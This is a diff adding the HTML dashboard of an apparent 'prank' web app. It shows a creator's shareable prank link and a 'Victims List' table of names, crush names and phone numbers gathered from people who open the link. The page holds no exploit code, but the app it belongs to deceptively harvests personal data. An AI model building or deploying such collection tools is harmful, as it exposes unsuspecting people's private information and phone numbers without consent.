@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prank Dashboard 🕵️‍♂️</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+    <div class="container" style="max-width: 800px;">
+        <div class="card">
+            <h1>Prank Dashboard</h1>
+            <p>Welcome back, <span id="creator-name">Mastermind</span>!</p>
+
+            <div class="result-box">
+                <p>Your Prank Link:</p>
+                <div class="link-box" id="prank-link"></div>
+                <button class="btn copy-btn" id="copy-btn">Copy Link</button>
+            </div>
+
+            <h2 style="margin-top: 30px;">Victims List 😈</h2>
+            <div style="overflow-x: auto;">
+                <table id="submissions-table">
+                    <thead>
+                        <tr>
+                            <th>Victim Name</th>
+                            <th>Crush Name</th>
+                            <th>Phone Number</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="submissions-body">
+                        <!-- Data will be inserted here -->
+                    </tbody>
+                </table>
+                <p id="no-data" class="hidden" style="margin-top: 20px;">No victims yet... Share your link!</p>
+            </div>
+
+            <a href="/" class="btn" style="margin-top: 30px; background: transparent; border: 1px solid white;">Create
+                New Prank</a>
+        </div>
+    </div>
+    <script src="js/dashboard.js"></script>
+</body>
+
+</html>
